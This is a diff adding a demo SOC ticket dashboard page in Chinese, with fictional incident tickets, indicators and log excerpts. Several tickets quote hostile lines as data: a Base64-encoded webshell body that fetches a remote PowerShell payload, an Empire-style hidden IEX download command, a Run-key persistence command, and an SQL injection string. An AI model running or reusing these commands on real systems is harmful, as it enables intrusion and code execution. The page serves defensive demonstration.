@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<title>SOC 安全工单管理系统</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f0f2f5; color: #1a1a2e; }
+
+.header { background: #16213e; color: #fff; padding: 16px 32px; display: flex; align-items: center; justify-content: space-between; }
+.header h1 { font-size: 18px; font-weight: 600; }
+.header span { font-size: 12px; color: #8892b0; }
+
+.toolbar { background: #fff; border-bottom: 1px solid #e2e8f0; padding: 12px 32px; display: flex; gap: 12px; align-items: center; }
+.toolbar input { padding: 6px 12px; border: 1px solid #cbd5e1; border-radius: 6px; font-size: 13px; width: 280px; }
+.toolbar select { padding: 6px 10px; border: 1px solid #cbd5e1; border-radius: 6px; font-size: 13px; }
+.toolbar button { padding: 6px 16px; background: #2563eb; color: #fff; border: none; border-radius: 6px; font-size: 13px; cursor: pointer; }
+
+.container { padding: 24px 32px; }
+.stats { display: flex; gap: 16px; margin-bottom: 20px; }
+.stat-card { background: #fff; border-radius: 8px; padding: 14px 20px; border: 1px solid #e2e8f0; flex: 1; }
+.stat-card .label { font-size: 12px; color: #64748b; }
+.stat-card .value { font-size: 24px; font-weight: 700; margin-top: 4px; }
+.stat-card.critical .value { color: #dc2626; }
+.stat-card.high .value { color: #ea580c; }
+.stat-card.medium .value { color: #d97706; }
+.stat-card.low .value { color: #16a34a; }
+
+table { width: 100%; border-collapse: collapse; background: #fff; border-radius: 8px; overflow: hidden; border: 1px solid #e2e8f0; }
+thead { background: #f8fafc; }
+th { text-align: left; padding: 10px 14px; font-size: 12px; font-weight: 600; color: #64748b; border-bottom: 2px solid #e2e8f0; text-transform: uppercase; letter-spacing: .03em; }
+td { padding: 12px 14px; font-size: 13px; border-bottom: 1px solid #f1f5f9; vertical-align: top; }
+tr.ticket-row:hover { background: #f0f7ff; }
+
+.badge { display: inline-block; padding: 2px 8px; border-radius: 10px; font-size: 11px; font-weight: 600; }
+.badge-critical { background: #fef2f2; color: #dc2626; }
+.badge-high { background: #fff7ed; color: #ea580c; }
+.badge-medium { background: #fefce8; color: #d97706; }
+.badge-low { background: #f0fdf4; color: #16a34a; }
+
+.status { display: inline-block; padding: 2px 8px; border-radius: 10px; font-size: 11px; font-weight: 500; }
+.status-open { background: #dbeafe; color: #2563eb; }
+.status-investigating { background: #fef3c7; color: #92400e; }
+.status-contained { background: #e0e7ff; color: #4338ca; }
+.status-resolved { background: #dcfce7; color: #166534; }
+
+td.desc { color: #475569; line-height: 1.5; max-width: 500px; }
+.ticket-id { font-family: 'SF Mono', Monaco, monospace; color: #2563eb; font-weight: 500; cursor: pointer; }
+.ticket-id:hover { text-decoration: underline; }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <h1>👁 SOC 安全运营中心 — 工单管理</h1>
+  <span>当前用户：analyst_zhangwei | 2026-08-24 23:05</span>
+</div>
+
+<div class="toolbar">
+  <input type="text" placeholder="搜索工单 ID / 标题 / IP ...">
+  <select><option>全部严重级别</option><option>严重</option><option>高</option><option>中</option><option>低</option></select>
+  <select><option>全部状态</option><option>待处理</option><option>调查中</option><option>已控制</option><option>已关闭</option></select>
+  <button>查询</button>
+</div>
+
+<div class="container">
+  <div class="stats">
+    <div class="stat-card critical"><div class="label">严重</div><div class="value">4</div></div>
+    <div class="stat-card high"><div class="label">高</div><div class="value">9</div></div>
+    <div class="stat-card medium"><div class="label">中</div><div class="value">14</div></div>
+    <div class="stat-card low"><div class="label">低</div><div class="value">5</div></div>
+  </div>
+
+  <table>
+    <thead>
+      <tr>
+        <th style="width:120px">工单 ID</th>
+        <th style="width:70px">严重级别</th>
+        <th style="width:90px">状态</th>
+        <th>标题</th>
+        <th class="desc">描述 / IOC</th>
+        <th style="width:90px">负责人</th>
+        <th style="width:100px">发现时间</th>
+      </tr>
+    </thead>
+    <tbody>
+      <!-- ↓↓↓ 演示工单：覆盖 短链还原 / 同形域名检测 / Base64 解码 / JSON 格式化 ↓↓↓ -->
+      <tr class="ticket-row">
+        <td><span class="ticket-id">SOC-2026-0896</span></td>
+        <td><span class="badge badge-critical">严重</span></td>
+        <td><span class="status status-investigating">调查中</span></td>
+        <td>终端失陷——研发部员工运行伪装工具的远控木马</td>
+        <td class="desc">EDR 告警：研发部工作站 WS-RD-017（10.10.40.17，用户 chenjia@corp.com）于 22:31 执行异常程序 C:\Users\chenjia\Downloads\PdfMerge_Pro_v3.2.exe，样本 SHA256: d7bc758160ca6ddaa7ac16ff2a1c48a8481ed0cde96baa9d9fe6608b34f076c6（VirusTotal 41/72 报毒，家族 Gh0st 变种）。进程链：explorer.exe → PdfMerge_Pro_v3.2.exe → cmd.exe /c "reg add HKCU\...\Run /v Update /t REG_SZ /d %APPDATA%\svch0st.exe" → 与 103.208.220.59:8443 建立长连接（心跳间隔 60s，Gh0st 特征）。主机已发现键盘记录行为与 Chrome 保存凭据目录读取。样本来源于某"PDF 合并工具"破解站 download-pdf-tools[.]top。已网络隔离主机，待取证镜像与全盘扫描，排查同网段其他终端是否下载过同 hash 样本。</td>
+        <td>zhangwei</td>
+        <td>08-24 22:41</td>
+      </tr>
+      <tr class="ticket-row">
+        <td><span class="ticket-id">SOC-2026-0895</span></td>
+        <td><span class="badge badge-high">高</span></td>
+        <td><span class="status status-open">待处理</span></td>
+        <td>钓鱼邮件——短链跳转伪装微软登录页</td>
+        <td class="desc">网关邮件网关捕获批量钓鱼邮件（发件人 it-support@rnicrosoft-security.com，注意 rn 伪装 m），正文诱导用户点击短链 https://za8.cc/qeqmQb 重置密码。短链疑似跳转至 login-microsoftonline[.]verify-secure.xyz（仿冒微软登录页）。已有 6 名用户反馈点击，其中 2 人输入了域凭据。附件 Office_Security_Patch.html 哈希 MD5: 9f1c4a7e2b8d3f6a5c0e1d2b3a4f5e6d。建议立即还原短链真实指向并全网封禁目标域名。</td>
+        <td>zhangwei</td>
+        <td>08-24 22:03</td>
+      </tr>
+      <tr class="ticket-row">
+        <td><span class="ticket-id">SOC-2026-0894</span></td>
+        <td><span class="badge badge-high">高</span></td>
+        <td><span class="status status-investigating">调查中</span></td>
+        <td>疑似 Webshell——POST 请求体 Base64 编码通信</td>
+        <td class="desc">WAF 日志发现对外 Web 服务器 10.10.30.18（OA 系统 oa.internal.corp）存在可疑 POST 请求：
+POST /upload/files/attachments/2026/help.php HTTP/1.1
+Body: Y21kPXdob2FtaSZwd2Q9QzpcaW5ldHB1Ylx3d3dyb290Jm1vZGU9ZXhlYw==
+同 IP 另一请求体：SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly80NS4xNTUuMjA1LjIzMy9wYXlsb2FkLnBzMScp
+请求特征符合冰蝎/哥斯拉一类加密 Webshell 流量模式，源 IP 45.155.205.233（境外）。help.php 创建时间为 08-23 23:41，早于告警 20+ 小时，需排查期间是否有横向移动。站点根目录已隔离，待解码确认命令内容后进一步处置。</td>
+        <td>liming</td>
+        <td>08-24 21:36</td>
+      </tr>
+      <tr class="ticket-row">
+        <td><span class="ticket-id">SOC-2026-0893</span></td>
+        <td><span class="badge badge-medium">中</span></td>
+        <td><span class="status status-open">待处理</span></td>
+        <td>仿冒站点告警——同形异义字符域名钓鱼</td>
+        <td class="desc">员工上报两类仿冒域名：① gοogle.com（其中 ο 为希腊字母 omicron U+03BF，非拉丁字母 o），页面为 Google 首页高仿，实际窃取输入凭据；② аpple-id[.]com（首字符 а 为西里尔字母 U+0430），仿冒 Apple ID 登录页。DNS 日志显示内网共有 11 台主机在近 48 小时内解析过上述域名，涉及研发部与市场部。建议：全 DNS 出口封禁 + 排查涉事主机凭据是否已提交，并对全员推送同形异义字钓鱼识别提醒。</td>
+        <td>wangfang</td>
+        <td>08-24 21:02</td>
+      </tr>
+      <tr class="ticket-row">
+        <td><span class="ticket-id">SOC-2026-0892</span></td>
+        <td><span class="badge badge-medium">中</span></td>
+        <td><span class="status status-investigating">调查中</span></td>
+        <td>API 异常登录——服务账号疑似撞库</td>
+        <td class="desc">SIEM 聚合的 API 网关审计日志（近 10 分钟片段）：
+{"events":[{"ts":"2026-08-24T20:52:11Z","event":"login_failed","src_ip":"198.51.100.77","user":"svc_backup","ua":"python-requests/2.31.0"},{"ts":"2026-08-24T20:52:14Z","event":"login_failed","src_ip":"198.51.100.77","user":"svc_backup","ua":"python-requests/2.31.0"},{"ts":"2026-08-24T20:53:02Z","event":"login_success","src_ip":"198.51.100.77","user":"svc_backup","ua":"python-requests/2.31.0","session":"eyJhbGciOiJIUzI1NiJ9"},{"ts":"2026-08-24T20:53:40Z","event":"data_export","user":"svc_backup","rows":128400,"dest":"s3://backup-dump-0824"}]}
+svc_backup 为备份服务账号，正常仅从内网 10.10.5.0/24 调用，本次来源为外部 IP 且 UA 异常，47 次失败后成功，随后触发 12.8 万行数据导出。疑似撞库成功，需吊销会话令牌并轮换该账号密钥。</td>
+        <td>chenyu</td>
+        <td>08-24 20:58</td>
+      </tr>
+      <!-- ↑↑↑ 演示工单结束 ↑↑↑ -->
+      <tr class="ticket-row">
+        <td><span class="ticket-id">SOC-2026-0891</span></td>
+        <td><span class="badge badge-critical">严重</span></td>
+        <td><span class="status status-investigating">调查中</span></td>
+        <td>疑似 Cobalt Strike Beacon C2 通信</td>
+        <td class="desc">内网服务器 10.10.25.47 向外域 IP 185.174.132.118:443 发起异常 TLS 连接，JA3 指纹匹配 Cobalt Strike Malleable C2。该 IP 在 VirusTotal 检测率 23/72，Shodan 显示为开放代理。相关域名 malicious-cdn.update-service[.]net 解析到同一 IP。已提取样本 SHA256: a3f8d2e1b9c4...f7e6d2</td>
+        <td>zhangwei</td>
+        <td>08-24 19:32</td>
+      </tr>
+      <tr class="ticket-row">
+        <td><span class="ticket-id">SOC-2026-0890</span></td>
+        <td><span class="badge badge-critical">严重</span></td>
+        <td><span class="status status-open">待处理</span></td>
+        <td>勒索软件攻击——财务部公司电脑被加密</td>
+        <td class="desc">财务部 3 台 Windows 工作站发现大量 .locked 文件，勒索信件留存在桌面。加密文件后缀 .encrypted。攻击者通过铓鱼邮件（伪装财务报表）投递，恶意宏 SHA256: e7a1b3c9d2f4...8b5a1c。C2: 91.234.12.67。影响范围扩大中，已启动应急响应流程。网络检测发现 RDP 横向移动 10.10.25.0/24 网段。</td>
+        <td>liming</td>
+        <td>08-24 18:07</td>
+      </tr>
+      <tr class="ticket-row">
+        <td><span class="ticket-id">SOC-2026-0889</span></td>
+        <td><span class="badge badge-critical">严重</span></td>
+        <td><span class="status status-contained">已控制</span></td>
+        <td>Web 应用 SQL 注入——客户数据泄露风险</td>
+        <td class="desc">
+客户门户系统（crm.internal.corp）日志发现 SQL 注入尝试：
+POST /api/v2/customers/search
+Body: {"name": "'; DROP TABLE sessions;--"}
+源 IP: 203.0.113.42（外部）。WAF 已拦截。攻击者使用 SQLMap 5.2 指纹。已确认未造成数据泄露，但发现同一源 IP 近 7 天内共 342 次请求。建议将 203.0.113.0/24 加入 IP 封禁名单。</td>
+        <td>wangfang</td>
+        <td>08-24 16:45</td>
+      </tr>
+      <tr class="ticket-row">
+        <td><span class="ticket-id">SOC-2026-0888</span></td>
+        <td><span class="badge badge-high">高</span></td>
+        <td><span class="status status-investigating">调查中</span></td>
+        <td>内部用户可疑横向移动检测</td>
+        <td class="desc">用户 jsmith@corp.com 账户在 72 小时内登录过 14 个不同内网主机，包括开发环境服务器、文件服务器和数据库服务器。该用户本职为前台运营，无需登录这些服务器。疑似凭证崩溃或账户滥用。已触发密码重置并暂停账户。MFA 日志显示该账户未启用 MFA（属于异常，全公司 98% 已开启）。</td>
+        <td>zhangwei</td>
+        <td>08-24 14:22</td>
+      </tr>
+      <tr class="ticket-row">
+        <td><span class="ticket-id">SOC-2026-0887</span></td>
+        <td><span class="badge badge-high">高</span></td>
+        <td><span class="status status-open">待处理</span></td>
+        <td>DDoS 攻击——对外服务网站不可用</td>
+        <td class="desc">
+公司官网 www.example-corp[.]com 自 14:00 起受到 DDoS 攻击，峰值流量 12Gbps。攻击类型为 DNS Amplification + HTTP Flood 混合。CDN 已启用 DDoS 防护，但源 IP 分布在多个国家，疑似由僵尸网络发起。已通知运营商上游清理。当前服务恢复 80%，仍有间歇性超时。影响用户约 2000+。</td>
+        <td>chenyu</td>
+        <td>08-24 14:00</td>
+      </tr>
+      <tr class="ticket-row">
+        <td><span class="ticket-id">SOC-2026-0886</span></td>
+        <td><span class="badge badge-high">高</span></td>
+        <td><span class="status status-resolved">已关闭</span></td>
+        <td>恶意软件检测——Empire PowerShell Stager</td>
+        <td class="desc">
+终端检测引擎拦截到 PowerShell 下载 Empire Stager：
+powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://malicious.ps1')"
+源主机：WS-FIN-042（财务部）。已确认是员工点击铓鱼邮件触发。恶意脚本未执行成功（被 AppLocker 拦截）。已隔离主机并清理。</td>
+        <td>liming</td>
+        <td>08-24 11:30</td>
+      </tr>
+      <tr class="ticket-row">
+        <td><span class="ticket-id">SOC-2026-0885</span></td>
+        <td><span class="badge badge-medium">中</span></td>
+        <td><span class="status status-investigating">调查中</span></td>
+        <td>VPN 异常登录——非工作时段</td>
+        <td class="desc">用户 lihua@corp.com 通过 VPN 从外国 IP 45.33.32.156（美国）在凌晨 03:17 登录内网，该用户本职为国内 HR，无出差记录。登录后访问了文件服务器 DFS 共享目录，下载约 2.3GB 文件。已暂停 VPN 账户并开启调查。疑似账户凭据泄露。</td>
+        <td>wangfang</td>
+        <td>08-24 08:45</td>
+      </tr>
+      <tr class="ticket-row">
+        <td><span class="ticket-id">SOC-2026-0884</span></td>
+        <td><span class="badge badge-medium">中</span></td>
+        <td><span class="status status-resolved">已关闭</span></td>
+        <td>内部 DNS 异常查询——疑似数据掬取</td>
+        <td class="desc">DNS 日志显示内网主机 10.10.1.55 向外请求大量 TXT 记录查询，目标域名 exfil.attacker-cdn[.]xyz。查询模式符合 DNS Tunneling 特征（高频率、长子域名、固定间隔）。经查证为开发环境测试脚本遗漏，已清理并关闭相关定时任务。</td>
+        <td>chenyu</td>
+        <td>08-23 22:10</td>
+      </tr>
+    </tbody>
+  </table>
+</div>
+
+</body>
+</html>
